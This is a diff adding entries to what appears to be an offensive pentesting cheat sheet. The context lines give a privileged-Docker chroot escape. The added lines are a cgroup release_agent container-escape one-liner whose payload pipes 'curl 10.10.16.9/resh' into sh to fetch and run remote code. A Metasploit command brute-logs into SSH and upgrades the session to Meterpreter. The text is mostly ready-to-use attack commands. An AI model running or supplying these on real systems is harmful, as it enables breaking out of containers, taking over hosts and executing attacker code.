@@ -1306,6 +1306,10 @@ docker ps -a
 docker commit 35c090009763 tempimg
 docker run -it --rm --privileged -v /:/mnt tempimg chroot /mnt sh
 
++---------- Privileged: True ----------+
+cat docker-compose.yml | grep 'privileged: true'
+d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`;mkdir -p $d/w;echo 1 >$d/w/notify_on_release;t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`;echo $t/c >$d/release_agent;printf '#!/bin/sh\ncurl 10.10.16.9/resh | sh' >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";
+
 [*] Meterpreter
 msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; setg RHOSTS $TARGET; setg USERNAME $USERNAME; setg PASSWORD $PASSWORD; setg SESSION 1; setg PAYLOAD linux/x64/meterpreter/bind_tcp; setg PAYLOAD_OVERRIDE linux/x64/meterpreter/bind_tcp; setg PLATFORM_OVERRIDE linux; setg PSH_ARCH_OVERRIDE x64; run; background; use post/multi/manage/shell_to_meterpreter; run'
 
